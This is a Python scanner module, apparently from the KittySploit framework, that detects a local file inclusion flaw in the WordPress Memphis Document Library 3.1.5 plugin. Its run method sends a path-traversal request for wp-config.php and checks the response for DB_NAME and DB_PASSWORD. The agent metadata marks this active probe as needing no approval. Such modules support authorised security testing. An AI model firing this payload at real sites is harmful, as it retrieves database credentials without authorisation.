#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Memphis Document Library 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Memphis Document Library 3.1.5 - Local File Inclusion Detection',
        'description': 'WordPress Memphis Document Library 3.1.5 is vulnerable to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wpscan', 'wordpress', 'wp-plugin', 'lfi', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/39593',
            'https://wpscan.com/vulnerability/53999c06-05ca-44f1-b713-1e4d6b4a3f9f',
        ],
    }

    def run(self):
        for path in ('/mdocs-posts/?mdocs-img-preview=../../../wp-config.php', '/?mdocs-img-preview=../../../wp-config.php'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('DB_NAME', 'DB_PASSWORD',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="WordPress Memphis Document Library 3.1.5 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

